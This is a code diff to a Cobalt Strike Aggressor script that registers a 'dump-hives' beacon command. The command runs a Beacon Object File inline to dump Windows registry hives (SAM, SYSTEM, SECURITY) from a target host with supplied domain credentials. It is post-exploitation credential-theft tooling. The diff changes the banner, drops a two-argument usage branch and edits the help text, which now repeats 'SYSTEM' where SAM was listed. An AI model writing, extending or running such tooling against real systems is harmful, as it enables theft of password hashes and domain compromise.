@@ -6,7 +6,7 @@
 alias dump-hives {
     local('$handle $data $args $target $domain $user $pass');
 
-    btask($1, "\cBdump-hive-BOF | Berkan ER // B3R-SEC | github.com/erberkan\n");
+    btask($1, "\cBdump-hives-BOF | Berkan ER // B3R-SEC | github.com/erberkan\n");
 
     if (size(@_) == 4) {
 
@@ -15,10 +15,6 @@ alias dump-hives {
         $pass               = $4;  
 
         btask($1, "Create token as $user");
-    } 
-    else if (size(@_) == 2) {
-        $target = $2;
-        btask($1, "Target: $target");
     } else {
         berror($1, "Incorrect usage!");
     }
@@ -30,10 +26,11 @@ alias dump-hives {
     $args = bof_pack($1, "zzzz", $target, $domain, $user, $pass);
 
     beacon_inline_execute($1, $data, "go", $args);
+
 }
 
 beacon_command_register(
     "dump-hives", 
-    "Dump SAM, SYSTEM and SECURITY hives under C:\ drive.", 
-    "Synopsis: dump-hives [target dc] [DOMAIN\\user] [password]"
+    "Dump SYSTEM, SYSTEM and SECURITY hives under C:\\ drive, If user has SeBackupPriv", 
+    "Synopsis: dump-hives [target] [DOMAIN\\user] [password]"
 );
